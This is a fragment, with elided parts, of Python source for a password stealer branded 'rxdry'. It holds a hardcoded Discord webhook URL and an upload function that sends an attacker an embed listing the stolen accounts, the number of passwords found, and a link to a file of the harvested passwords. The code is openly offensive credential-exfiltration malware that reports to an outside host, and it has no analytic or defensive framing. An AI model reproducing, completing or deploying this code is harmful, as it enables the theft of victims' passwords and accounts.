...
hook = "https://discord.com/api/webhooks/1074409435683901460/CJ-SUwW7GHPCL1QMqRjiovZwyTGgoB8ifdAv3pMBXHxB7vJtmqpI1giZrwPmmSDnePFS"
...
def upload(name, link):
    ...
    if name == "wppassw":
        ...
        data = {
            ...
            "embeds": [
                {
                    "title": "rxdry | Password Stealer",
                    "description": f"**Accounts**:\n{ra}\n\n**Data:**\n • **{P4sswCount}** Passwords Found\n • [rxdryPassword.txt]({link})",
                    "color": 2895667,
                    "footer": {
                        "text": "rxdry",
                        "icon_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg"
